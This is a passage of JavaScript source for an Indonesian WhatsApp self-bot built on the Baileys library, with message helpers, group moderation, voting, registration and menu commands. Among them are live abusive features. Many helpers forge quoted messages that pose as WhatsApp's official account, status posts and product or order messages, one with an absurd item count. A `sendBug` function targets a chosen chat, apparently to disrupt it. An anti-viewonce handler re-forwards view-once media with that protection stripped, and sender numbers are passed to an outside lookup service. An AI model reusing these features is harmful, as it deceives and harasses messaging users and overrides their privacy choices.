                          participant : '0@s.whatsapp.net'
                        },
       message: {
                    orderMessage: {
                            itemCount : 800000,
                            status: 1,
                            surface : 1,
                            message: `${ucapanWaktu} ${pushname}`, //Kasih namalu
                            orderTitle: `${ucapanWaktu} ${pushname}`,
                            thumbnail: fake, //Gambarnye
                            sellerJid: '0@s.whatsapp.net' 
                          }
                        }
                      }
const finv = {
	"key": {
		"fromMe": false,
		"participant": "0@s.whatsapp.net",
		"remoteJid": "0@s.whatsapp.net"
	},
	"message": {
		"groupInviteMessage": {
			"groupJid": "6288213840883-1616169743@g.us",
			"inviteCode": `${ucapanWaktu} ${pushname}`,
			"groupName": `${ucapanWaktu} ${pushname}`, 
            "caption": `${ucapanWaktu} ${pushname}`, 
            'jpegThumbnail': fake
		}
	}
}
    const fdoc = {
      key: { participant: "0@s.whatsapp.net" },
      message: { documentMessage: { title: fake, jpegThumbnail: thumb } },
    };
    const fvn = {
      key: {
        participant: `16505434800@s.whatsapp.net`,
        ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}),
      },
      message: {
        audioMessage: {
          mimetype: "audio/ogg; codecs=opus",
          seconds: 999999,
          ptt: "true",
        },
      },
    };
    const fgif = {
      key: {
        participant: `0@s.whatsapp.net`,
        ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}),
      },
      message: {
        videoMessage: {
          title: fake,
          h: `Hmm`,
          seconds: "99999",
          gifPlayback: "true",
          caption: fake,
          jpegThumbnail: thumb,
        },
      },
    };
const fstick = {
"key": {
	  "participant": `0@s.whatsapp.net`,
      "remoteJid": "6289643739077-1613049930@g.us",
      "fromMe": false,
      "id": "3B64558B07848BD81108C1D14712018E"
    },
    "message": {
      "stickerMessage": {
        "fileSha256": "5b017c6ac1fb953c7bd21034d2fca5fad75ef2da4c3b2c2877ef49fa544e74bf",
		"pngThumbnail": iye,
	 "mimetype": "image/webp",
        "height": 64,
        "width": 64,
        "directPath": "/v/t62.15575-24/56110107_763365384384977_5720135628188301198_n.enc?oh=450f8f684b06f0ba2dbc9779e5f06774&oe=605B81EE",
        "fileLength": "0418",
        "firstFrameLength": 3626,
        "isAnimated": false
      }
    },
    "messageTimestamp": "1614070775",
    "status": "PENDING"
  }
// STICKER

    const fgclink = {
      key: { participant: "0@s.whatsapp.net", remoteJid: "0@s.whatsapp.net" },
      message: {
        groupInviteMessage: {
          groupJid: "6288213840883-1616169743@g.us",
          inviteCode: "m",
          groupName: "P",
          caption: fake,
          jpegThumbnail: thumb,
        },
      },
    };
const fvid = {
	 key: { 
          fromMe: false,
	      participant: `628551000185@s.whatsapp.net`, ...(from ? 
	 { remoteJid: "6289643739077-1613049930@g.us" } : {}) 
                },
	 message: { 
                 "videoMessage": { 
                 "title": `${ucapanWaktu} ${pushname}`,
                 "h": `${ucapanWaktu} ${pushname}`,
                 'duration': '99999', 
                 'caption': `${ucapanWaktu} ${pushname}`,
                 'jpegThumbnail': iye
                        }
                       }
	                  }
const ftex = {
	 key: { 
          fromMe: false,
	      participant: `0@s.whatsapp.net`, ...(from ? 
	 { remoteJid: "6289643739077-1613049930@g.us" } : {}) 
                },
	 message: { 
		"extendedTextMessage": {
                 "text": `${ucapanWaktu} ${pushname}`,
                 "title": `${ucapanWaktu} ${pushname}`,
                 'jpegThumbnail': iye
                        }
	                  } 
                     }
    const floc = {
      key: { participant: "0@s.whatsapp.net" },
      message: { locationMessage: { name: fake, jpegThumbnail: thumb } },
    };
    const fakestatus = (teks) => {
      ALIYABOT.sendMessage(from, teks, text, {
        quoted: {
          key: {
            fromMe: false,
            participant: `0@s.whatsapp.net`,
            ...(from ? { remoteJid: "status@broadcast" } : {}),
          },
          message: {
            imageMessage: {
              url: "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
              mimetype: "image/jpeg",
              caption: fake,
              fileSha256: "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
              fileLength: "28777",
              height: 1080,
              width: 1079,
              mediaKey: "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
              fileEncSha256: "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
              directPath:
                "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
              mediaKeyTimestamp: "1610993486",
              jpegThumbnail: fs.readFileSync("./stik/thumb.jpeg"),
              scansSidecar:
                "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw==",
            },
          },
        },
      });
    };
    const fakethumb = (teks, yes) => {
      ALIYABOT.sendMessage(from, teks, image, {
        thumbnail: fs.readFileSync("./stik/fake.jpeg"),
        quoted: mek,
        caption: yes,
      });
    };
    const fakegroup = (teks) => {
            ALIYABOT.sendMessage(from, teks, text, {
                quoted: {
                    key: {
                        fromMe: false,
                        participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289523258649-1604595598@g.us" } : {})
                    },
                    message: {
                        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": "AlyaBot",
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": fs.readFileSync(`./stik/thumb.jpeg`),
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                        }
                    }
                }
            })
        }
    const sendStickerFromUrl = async (to, url) => {
      var names = Date.now() / 10000;
      var download = function (uri, filename, callback) {
        request.head(uri, function (err, res, body) {
          request(uri)
            .pipe(fs.createWriteStream(filename))
            .on("close", callback);
        });
      };
ALIYABOT.on('CB:action,,battery', json => {
		global.batteryLevelStr = json[2][0][1].value
	   global.batterylevel = parseInt(batteryLevelStr)
		baterai = batterylevel
        if (json[2][0][1].live == 'true') charging = true
       if (json[2][0][1].live == 'false') charging = false
        console.log(json[2][0][1])
		console.log('Baterai : ' + batterylevel+'%')
	})
	global.batrei = global.batrei ? global.batrei : []
		ALIYABOT.on('CB:action,,battery', json => {
		const batteryLevelStr = json[2][0][1].value
		const batterylevel = parseInt(batteryLevelStr)
		global.batrei.push(batterylevel)
		}) 
download(url, "./stik" + names + ".png", async function () {
        console.log("selesai");
        let filess = "./stik" + names + ".png";
        let asw = "./stik" + names + ".webp";
        exec(
          `ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`,
          (err) => {
            let media = fs.readFileSync(asw);
            ALIYABOT.sendMessage(to, media, MessageType.sticker, { quoted: mek });
            fs.unlinkSync(filess);
            fs.unlinkSync(asw);
          }
        );
      });
    };
if (budy.toLowerCase() === `8473`){
		if (isRegister) return 
		    register.push(sender)
		    fs.writeFileSync('./database/user/registered.json', JSON.stringify(register))
		    teks = `Verification success\n\nPlease send *!menu* to view menu`
		    ALIYABOT.sendMessage(from, teks, text, {quoted:mek})
}          /*if (!mek.key.fromMe && banChats === false) return*/
	              
           
const getRegisteredRandomId = () => {
            return _registered[Math.floor(Math.random() * _registered.length)].id
        }
        const addRegisteredUser = (userid, sender, age, time, serials) => {
            const obj = { id: userid, name: sender, age: age, time: time, serial: serials }
            _registered.push(obj)
            fs.writeFileSync('./database/user/registered.json', JSON.stringify(_registered))
        }
        
   
//******************* 》banchat《 ********************\\
if (isBanchat){
if (!itsMe && !isOwner)return 
}
    const ftokoo = {
      key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {}),
      },
      message: {
        productMessage: {
          product: {
            productImage: {
              mimetype: "image/jpeg",
              jpegThumbnail: fs.readFileSync(`./stik/thumb.jpeg`), //Gambarnye
            },
            title: "FakeReply Bang", //Kasih namalu
            description: "SELF BOT",
            currencyCode: "USD",
            priceAmount1000: "2000",
            retailerId: "ALIYABOT",
            productImageCount: 1,
          },
          businessOwnerJid: `0@s.whatsapp.net`,
        },
      },
    };
/// VIEW ONCE VID
const foncevid = { 
key: {fromMe: false, remoteJid: "6281315995629@g.us", participant: '0@s.whatsapp.net'}, 
message: { 
  videoMessage: { 
  viewOnce: true
},
},
    };    
 const ftok = {
key: {
			fromMe: false,
			participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})
		},
		message: {
			"productMessage": {
				"product": {
					"productImage":{
						"mimetype": "image/jpeg",
						"jpegThumbnail": iye //Gambarnye
					},
					"title": `${ucapanWaktu} ${pushname}`, //Kasih namalu 
					"description": `${ucapanWaktu} ${pushname}`, 
					"currencyCode": "USD",
					"priceAmount1000": "2000",
					"retailerId": `${ucapanWaktu} ${pushname}`,
					"productImageCount": 1
				},
				    "businessOwnerJid": `0@s.whatsapp.net`
		}
	}
}
    const sendMediaURL = async (to, url, text = "", mids = []) => {
      if (mids.length > 0) {
        text = normalizeMention(to, text, mids);
      }
      const fn = Date.now() / 10000;
      const filename = fn.toString();
      let mime = "";
      var download = function (uri, filename, callback) {
        request.head(uri, function (err, res, body) {
          mime = res.headers["content-type"];
          request(uri)
            .pipe(fs.createWriteStream(filename))
            .on("close", callback);
        });
      };
      download(url, filename, async function () {
        console.log("done");
        let media = fs.readFileSync(filename);
        let type = mime.split("/")[0] + "Message";
        if (mime === "image/gif") {
          type = MessageType.video;
          mime = Mimetype.gif;
        }
        if (mime.split("/")[0] === "audio") {
          mime = Mimetype.mp4Audio;
        }
        ALIYABOT.sendMessage(to, media, type, {
          quoted: mek,
          mimetype: mime,
          caption: text,
          contextInfo: { mentionedJid: mids },
        });

        fs.unlinkSync(filename);
      });
    };
const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
///Button Text

const sendButMessage = (id, text1, desc1, but = [], options = {}) => {
const buttonMessage = {
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 1
}
ALIYABOT.sendMessage(id, buttonMessage, MessageType.buttonsMessage, options)
}
///Button Image
const sendButImage = async(id, text1, desc1, gam1, but = [], options = {}) => {
kma = gam1
mhan = await ALIYABOT.prepareMessage(from, kma, image)
const buttonMessages = {
imageMessage: mhan.message.imageMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 4
}
ALIYABOT.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
///Button Video
const sendButVideo = async(id, text1, desc1, vid1, but = [], options = {}) => {
kma = vid1
mhan = await ALIYABOT.prepareMessage(from, kma, video)
const buttonMessages = {
videoMessage: mhan.message.videoMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 5
}
ALIYABOT.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
//Button ocument
const Sendbutdocument = async(id, text1, desc1, file1, doc1, but = [], options = {}) => {
media = file1
kma = doc1
mhan = await ALIYABOT.prepareMessage(from, media, document, kma)
const buttonMessages = {
documentMessage: mhan.message.documentMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: "DOCUMENT"
}
ALIYABOT.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
///Button Location
const sendButLocation = async (id, text1, desc1, gam1, but = [], options = {}) => {
kma = gam1
mhan = await ALIYABOT.prepareMessage(from, kma, location)
const buttonMessages = {
locationMessage: mhan.message.locationMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 6
}
ALIYABOT.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
    const kick = function (from, orangnya) {
      for (let i of orangnya) {
        ALIYABOT.groupRemove(from, [i]);
      }
    };
    const add = function (from, orangnya) {
      ALIYABOT.groupAdd(from, orangnya);
    };
        const grupinv = (teks) => {
        	grup = ALIYABOT.prepareMessageFromContent(from, { "groupInviteMessage": { "groupJid": '6288213840883-1616169743@g.us', "inviteCode": 'https://chat.whatsapp.com/Dgt6JhzTvlmEor8Zz23fHx', "groupName": `[©Apriliya✓Chan]`, "footerText": "*_© Dcode Denpa_*", "jpegThumbnail": iye, "caption": teks}}, {quoted:mek})
            ALIYABOT.relayWAMessage(grup)
        }
const fakeitem = (teks) => {
            ALIYABOT.sendMessage(from, teks, text, {
                quoted: {
        key:{
        	fromMe:false,
        participant:`0@s.whatsapp.net`, ...(from ? {
remoteJid :"6289523258649-1604595598@g.us" }: {})
                    },message:{"orderMessage":{"orderId":"174238614569481","thumbnail":fs.readFileSync(`./stik/thumb.jpeg`),"itemCount":10,"status":"INQUIRY","surface":"CATALOG","message":`ALIYABOT`,"token":"AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="}}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true})}                    
// Reply
const fakewa = (teks) => {
      ALIYABOT.sendMessage(from, teks, text, { quoted: mek });
    };
const replyfakelink = (teks) => {        
ALIYABOT.sendMessage(from, teks, text, { thumbnail: fake, sendEphemeral: true, quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: `${jam} - ${week} ${weton} - ${date}`,body:"",previewType:"PHOTO",thumbnail:iye,sourceUrl:`https://wa.me/62858157008613?text=Assalamualaikum`}}})
		}
const reply = (teks) => {
ALIYABOT.sendMessage(from, teks, text,{contextInfo :{text: 'hi',
"forwardingScore": 1000000000,
isForwarded: false,
sendEphemeral: false,
"externalAdReply": {
                "title": `Whatsapp-BOT\nBy. (@Callmee_alya) •Instagram photos and Videos`,
                "body": "",
                "previewType": "PHOTO",
                "thumbnailUrl": "https://a.top4top.io/p_2073icief0.jpg",
                "thumbnail": fake,
                "sourceUrl": ``
},mentionedJid:[sender]}, quoted : mek})
};
//Awok
const katalog = (teks) => {
             res = ALIYABOT.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 499999999999999999, "message": teks, "footerText": "*ALIYABOT*", "thumbnail": bgg, "surface": 'CATALOG' }}, {quoted:mek})
             ALIYABOT.relayWAMessage(res)
        }
const replywa = (teks) => {
ALIYABOT.sendMessage(from, teks, text,{contextInfo :{text: 'hi',
"forwardingScore": 1000000000,
isForwarded: false,
sendEphemeral: false,
"externalAdReply": {
                "title": `Whatsapp`,
                "body": `wa.me/62858157008612`,
                "mediaType": "10",
                "mediaUrl": `wa.me/62858157008612`,
                "thumbnailUrl": "https://j.top4top.io/p_20682m4yj0.jpg",
                "thumbnail": iye,
                "sourceUrl": `wa.me/62858157008612`,
},mentionedJid:[sender]}, quoted : mek})
};
const fakeyt = (teks) => {
ALIYABOT.sendMessage(from, teks, text,{contextInfo :{text: 'hi',
"forwardingScore": 1000000000,
isForwarded: false,
sendEphemeral: false,
"externalAdReply": {
"title": `hallo ${pushname}` ,
"body": `${ucapanWaktu}`,
"mediaType": "2",
"thumbnailUrl": "https://c.top4top.io/p_2087f30hj1.jpeg",
"mediaUrl": "https://youtu.be/uygjD8rqVLE",
"thumbnail": fs.readFileSync('./stik/thumb.jpeg'),
"sourceUrl": "",
},mentionedJid:[sender]}, quoted : fgif})
};
// Support Di Versi 3.5.2 
    const sendBug = async (target, teks) => {
      if (!teks) teks = ".";
      await ALIYABOT.relayWAMessage(
        ALIYABOT.prepareMessageFromContent(
          target,
          ALIYABOT.prepareDisappearingMessageSettingContent(0),
          {}
        ),
        { waitForAck: true }
      );
      ALIYABOT.sendMessage(target, teks, "conversation");
    };

    //FUNCTION
    function clockString(ms) {
      let h = isNaN(ms) ? "--" : Math.floor(ms / 3600000);
      let m = isNaN(ms) ? "--" : Math.floor(ms / 60000) % 60;
      let s = isNaN(ms) ? "--" : Math.floor(ms / 1000) % 60;
      return [h, m, s].map((v) => v.toString().padStart(2, 0)).join(":");
    }

    cekafk(afk);
    if (!mek.key.remoteJid.endsWith("@g.us") && offline) {
      if (!mek.key.fromMe) {
        if (isAfk(mek.key.remoteJid)) return;
        addafk(mek.key.remoteJid);
        heheh = ms(Date.now() - waktu);
        ALIYABOT.sendMessage(
          mek.key.remoteJid,
          `@${owner} Sedang Offline!\n\n*Alasan :* ${alasan}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`,
          MessageType.text,
          {
            contextInfo: {
              mentionedJid: [`${owner}@s.whatsapp.net`],
              stanzaId: "B826873620DD5947E683E3ABE663F263",
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              quotedMessage: {
                imageMessage: {
                  caption: "*OFFLINE*",
                  jpegThumbnail: fs.readFileSync("./stik/thumb.jpeg"),
                },
              },
            },
          }
        );
      }
    }
    if (mek.key.remoteJid.endsWith("@g.us") && offline) {
      if (!mek.key.fromMe) {
        if (mek.message.extendedTextMessage != undefined) {
          if (mek.message.extendedTextMessage.contextInfo != undefined) {
            if (
              mek.message.extendedTextMessage.contextInfo.mentionedJid !=
              undefined
            ) {
              for (let ment of mek.message.extendedTextMessage.contextInfo
                .mentionedJid) {
                if (ment === `${owner}@s.whatsapp.net`) {
                  if (isAfk(mek.key.remoteJid)) return;
                  addafk(mek.key.remoteJid);
                  heheh = ms(Date.now() - waktu);
                  ALIYABOT.sendMessage(
                    mek.key.remoteJid,
                    `@${owner} Sedang Offline!\n\n *Alasan :* ${alasan}\n *Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`,
                    MessageType.text,
                    {
                      contextInfo: {
                        mentionedJid: [`${owner}@s.whatsapp.net`],
                        stanzaId: "B826873620DD5947E683E3ABE663F263",
                        participant: "0@s.whatsapp.net",
                        remoteJid: "status@broadcast",
                        quotedMessage: {
                          imageMessage: {
                            caption: "*OFFLINE*",
                            jpegThumbnail: fs.readFileSync("./stik/thumb.jpeg"),
                          },
                        },
                      },
                    }
                  );
                }
              }
            }
          }
        }
      }
    }

    //========================================================================================================================//
    colors = ["red", "white", "black", "blue", "yellow", "green"];
    const isMedia = type === "imageMessage" || type === "videoMessage";
    const isQuotedImage =
      type === "extendedTextMessage" && content.includes("imageMessage");
    const isQuotedVideo =
      type === "extendedTextMessage" && content.includes("videoMessage");
    const isQuotedAudio =
      type === "extendedTextMessage" && content.includes("audioMessage");
    const isQuotedSticker =
      type === "extendedTextMessage" && content.includes("stickerMessage");

/*if (listbut) console.log("[",color("command","lime"),"]",time2,color(listbut,"lime"),"from",color(sender.split("@")[0],"cyan"))*/
//list command

async function sendFileFromUrl(from, url, caption, msg, men) {
            let mime = '';
            let res = await axios.head(url)
            mime = res.headers['content-type']
            let type = mime.split("/")[0]+"Message"
            if(mime === "image/gif"){
                type = MessageType.video
                mime = Mimetype.gif
            }
            if(mime === "application/pdf"){
                type = MessageType.document
                mime = Mimetype.pdf
            }
            if(mime.split("/")[0] === "audio"){
                mime = Mimetype.mp4Audio
            }
            return ALIYABOT.sendMessage(from, await getBuffer(url), type, {caption: caption, quoted: mek, mimetype: mime, contextInfo: {"mentionedJid": men ? men : []}})
        }
    if (!isGroup && prefix && command)
      console.log(
        "\x1b[1;31m~\x1b[1;37m>",
        "[\x1b[1;32mEXEC\x1b[1;37m]",
        time,
        color(command),
        "from",
        color(sender.split("@")[0]),
        "args :",
        color(args.length)
      );
    //if (!isGroup && !isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mTEXT\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
    if (prefix && command && isGroup)
      console.log(
        "\x1b[1;31m~\x1b[1;37m>",
        "[\x1b[1;32mEXEC\x1b[1;37m]",
        time,
        color(command),
        "from",
        color(sender.split("@")[0]),
        "in",
        color(groupName),
        "args :",
        color(args.length)
      );
    //if (!isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mTEXT\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
    if (isGroup && !isVote) {
      if (budy.toLowerCase() === "vote") {
        let vote = JSON.parse(fs.readFileSync(`./lib/${from}.json`));
        let _votes = JSON.parse(fs.readFileSync(`./lib/vote/${from}.json`));
        let fil = vote.map((v) => v.participant);
        let id_vote = sender ? sender : "6283833310095@s.whatsapp.net";
        if (fil.includes(id_vote)) {
          return mentions(
            "@" + sender.split("@")[0] + " Anda sudah vote",
            fil,
            true
          );
        } else {
          vote.push({
            participant: id_vote,
            voting: "✅",
          });
          fs.writeFileSync(`./lib/${from}.json`, JSON.stringify(vote));
          let _p = [];
          let _vote =
            "*Vote* " +
            "@" +
            _votes[0].votes.split("@")[0] +
            `\n\n*Alasan*: ${_votes[0].reason}\n*Jumlah Vote* : ${vote.length} Vote\n*Durasi* : ${_votes[0].durasi} Menit\n\n`;
          for (let i = 0; i < vote.length; i++) {
            _vote += `@${vote[i].participant.split("@")[0]}\n*Vote* : ${
              vote[i].voting
            }\n\n`;
            _p.push(vote[i].participant);
          }
          _p.push(_votes[0].votes);
          mentions(_vote, _p, true);
        }
      } else if (budy.toLowerCase() === "devote") {
        const vote = JSON.parse(fs.readFileSync(`./lib/${from}.json`));
        let _votes = JSON.parse(fs.readFileSync(`./lib/vote/${from}.json`));
        let fil = vote.map((v) => v.participant);
        let id_vote = sender ? sender : "62858157008612@s.whatsapp.net";
        if (fil.includes(id_vote)) {
          return mentions(
            "@" + sender.split("@")[0] + " Anda sudah vote",
            fil,
            true
          );
        } else {
          vote.push({
            participant: id_vote,
            voting: "❌",
          });
          fs.writeFileSync(`./lib/${from}.json`, JSON.stringify(vote));
          let _p = [];
          let _vote =
            "*Vote* " +
            "@" +
            _votes[0].votes.split("@")[0] +
            `\n\n*Alasan*: ${_votes[0].reason}\n*Jumlah Vote* : ${vote.length} Vote\n*Durasi* : ${_votes[0].durasi} Menit\n\n`;
          for (let i = 0; i < vote.length; i++) {
            _vote += `@${vote[i].participant.split("@")[0]}\n*Vote* : ${
              vote[i].voting
            }\n\n`;
            _p.push(vote[i].participant);
          }
          _p.push(_votes[0].votes);
          mentions(_vote, _p, true);
        }
      }
    }
    const sendKontak = (from, nomor, nama, org = "") => {
      const vcard =
        "BEGIN:VCARD\n" +
        "VERSION:3.0\n" +
        "FN:" +
        nama +
        "\n" +
        "ORG:" +
        org +
        "\n" +
        "TEL;type=CELL;type=VOICE;waid=" +
        nomor +
        ":+" +
        nomor +
        "\n" +
        "END:VCARD";
      ALIYABOT.sendMessage(
        from,
        { displayname: nama, vcard: vcard },
        MessageType.contact,
        { quoted: mek }
      );
    };
    //•======>> SUBSCRIBE : PEMUDA TEKNOLOGI <<====•\\
			if (bad.includes(messagesD)) {
kntl = `${args.join(' ')}`
nama = ("TOXIC DETECTED\nNIH PERGI KE ARAB")
impostor = ("BIAR GAK TOXIC")
ALIYABOT.sendMessage(from, { degreesLatitude: 21.422487, degreesLongitude: 39.826206,
name: nama,
address: impostor,
jpegThumbnail: fs.readFileSync('./stik/thumb.jpeg')}, MessageType.liveLocation, {quoted:floc})
}
    //kasih wm gw ajg kalau make
    if (isGroup && isAntilink && !mek.key.fromMe) {
      if (budy.includes("://chat.whatsapp.com/")) {
        if (isGroupAdmins) return reply("admin bebas");
        reply("ANTILINK DETECTED!! MAAF ANDA AKAN DIKICK ;V");
        ALIYABOT.groupRemove(from, [sender]);
      }
    }
    if (isGroup && isAntiviewonce && m.mtype == "viewOnceMessage") {
      reply(
        `@${sender.split("@")[0]} Terdeteksi mengirim gambar/video viewonce!`
      );
      var msg = { ...mek };
      msg.mek = mek.message.viewOnceMessage.message;
      msg.mek[Object.keys(msg.mek)[0]].viewOnce = false;
      ALIYABOT.copyNForward(m.chat, msg);
    }
    if (
      isGroup &&
      isAntihidetag &&
      m.message[m.mtype]?.contextInfo?.mentionedJid?.length ==
        groupMembers.length
    ) {
      console.log(
        color("[ANTI-HIDETAG]", "red"),
        color(`@${sender.split("@")[0]} mengirim pesan hidetag`, "white")
      );
      reply(`@${sender.split("@")[0]} Terdeteksi mengirim pesan hidetag!!`);
      kick(from, sender);
    }

    if (isGroup && isAntivirtex && !mek.key.fromMe) {
      if (budy.length > 700) {
        if (isGroupAdmins) return reply("admin bebas");
        reply("ANTIVIRTEX DETECTED!! MAAF ANDA AKAN DIKICK ;V");
        ALIYABOT.groupRemove(from, sender);
      }
    }
    if (isGroup && autojoin == true) {
      if (budy.includes("://chat.whatsapp.com/")) {
        console.log(
          color("[AUTO-JOIN]", "red"),
          color("YAHAHAHHAHAH", "white")
        );
        ALIYABOT.query({
          json: [
            "action",
            "invite",
            `${budy.replace("https://chat.whatsapp.com/", "")}`,
          ],
        });
      }
    }
    if (isGroup && isKickarea && !mek.key.fromMe) {
      if (sender.includes("62")) {
        reply("GRUP ONLY +62!");
        ALIYABOT.groupRemove(from, [sender]);
      }
    }
    // Runtime Di Bio Bang🌹\\
    let settingstatus = 0;
    if (new Date() * 1 - settingstatus > 1000) {
      let _uptime = process.uptime() * 1000;
      let uptime = clockString(_uptime);

await ALIYABOT.setStatus(`await aliya.toggleDisappearingMessages(from, 0) (Acthive)${uptime}`).catch((_) => _);
      settingstatus = new Date() * 1;
    }
    if (!mek.key.fromMe && banChats === true) return;
switch (command) {
case '!verify':
case 'verify':
if (isBanned) return reply(mess.ban)              
if (isRegistered) return reply('Akun kamu sudah terverfikasi')
const serialUser = createSerial(18)
	         try {
								ppimg = await ALIYABOT.getProfilePicture(`${sender.split('@')[0]}@c.us`)
								} catch {
								ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
							}
	        veri = sender
	        _registered.push(sender)
	        fs.writeFileSync('./database/user/registered.json', JSON.stringify(_registered))
	        addRegisteredUser(sender, serialUser)
	         const anuu = `「 *Verification success Please send *!menu* to view menu* 」
*Terimakasih Sudah Mendaftarkan Diri Dalam Database Bot WhatsApp*

*☂︎ Nama :* ${pushname}
*☂︎ API :* +${sender.split('@')[0]}
*☂︎ Serial:* ${serialUser}

*「 Verification success Please send !menu to view menu 」*`
         haitod = await getBuffer(`http://hadi-api.herokuapp.com/api/card/verify?nama=${encodeURI(pushname)}&member=${_registered.length}&seri=${serialUser}&pp=${ppimg}&bg=${ppimg}`)
             buttons = [{buttonId: `${prefix}menu`,buttonText:{displayText: `</️MENU`},type:1}]
              imageMsg = (await ALIYABOT.prepareMessageMedia(haitod, "imageMessage", { thumbnail: haitod, })).imageMessage
              buttonsMessage = {footerText:'jika button tidak muncul/tidak keliatan silahkan ketik #allmrnu︎', imageMessage: imageMsg,
              contentText:`${anuu}`,buttons,headerType:4}
              prep = await ALIYABOT.prepareMessageFromContent(from,{buttonsMessage},{quoted:mek})
              ALIYABOT.relayWAMessage(prep)
	         console.log(color('[REGISTER]'), color(time, 'yellow'), 'Serial:', color(serialUser, 'cyan'), 'in', color(sender || groupName))
	    // console.log(e)
            setTimeout( () => {
			ALIYABOT.updatePresence(from, Presence.composing)
			reply(`*Terimakasih Sekarang Anda Telah Terdaftar Di Database BOTZ*`)
		}, 2000)
        break        
case 'help':
        case 'menu':
        if (isBanned) return reply(mess.ban)
groups = ALIYABOT.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = ALIYABOT.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
           
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await ALIYABOT.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
        ptod = "62858157008612@s.whatsapp.net"
        dtod = '62858157008612'
        stod = `${sender}`
        uwuu = '```'
        yoii = '*'
       stst = await ALIYABOT.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://numlookupapi.com/api/validate/${senderNumber}`, {method: 'get'})
       menu = `Hai Kak @${sender.split('@')[0]}
       
[ *INFO BOT* ]
• *Creator Bot:* Alyaa
• *Lib:* Baileys 
• *Type:* NodeJS
• *Prefix:* Multi
• *Nama Bot:* Bot nolep
• *Tanggal:* 16 Desember : - 2021
• *Waktu:* ${time}
• *Baterai:* 100%
• *Runtime:* ${runtime(process.uptime())}
• *Owner:* @${owner}`
sendButLocation(from, `${menu}`,`Active : ${latensie.toFixed(4)} _Second_ : ${runtime(process.uptime())}`, {jpegThumbnail:ofrply}, [{buttonId:`${prefix}allmenu`,buttonText:{displayText:'MENU ALL'},type:1},{buttonId:`${prefix}sewa`,buttonText:{displayText:'SEWA BOT'},type:1},{buttonId:`${prefix}syarat`,buttonText:{displayText:'RULES BOT'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}})

break
case 'menuall':
if (isBanned) return reply(mess.ban)
const user1 = !mek.key.fromMe ? 'FALSE':'TRUE'
var gc1 = ALIYABOT.chats.array.filter(v => v.jid.endsWith('g.us'))
var private1 = ALIYABOT.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
